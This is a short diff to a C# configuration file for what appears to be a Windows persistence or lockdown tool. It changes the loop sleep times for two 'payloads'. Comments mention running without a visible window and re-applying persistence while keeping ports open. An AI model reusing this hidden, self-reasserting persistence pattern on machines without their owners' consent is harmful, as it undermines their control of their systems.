@@ -39,7 +39,7 @@ public class Config // This is for payload 2
     public static bool Debugging { get; private set; } = false; //Set to true for debugging messages and logs, to make the terminal show up, please change .csproj under both projects to compile to an "exe" instead of "winexe"
                                                                 // Basically: Winexe = No Window Created , Exe = Windowed Console App
 
-    public static int sleepTime { get; private set; } = 46000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
+    public static int sleepTime { get; private set; } = 40000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
                                                                // used 46 seconds for UB lockdown deploy. Lower time increases the strength of the persistence
 
     public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 53 }; // Ports to keep open
@@ -74,7 +74,7 @@ public class Config // This is for payload 3
     public static bool Debugging { get; private set; } = false; //Set to true for debugging messages and logs, to make the terminal show up, please change .csproj under both projects to compile to an "exe" instead of "winexe"
                                                                 // Basically: Winexe = No Window Created , Exe = Windowed Console App
 
-    public static int sleepTime { get; private set; } = 46000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
+    public static int sleepTime { get; private set; } = 52000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
                                                                // used 46 seconds for UB lockdown deploy. Lower time increases the strength of the persistence
 
     public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 53 }; // Ports to keep open
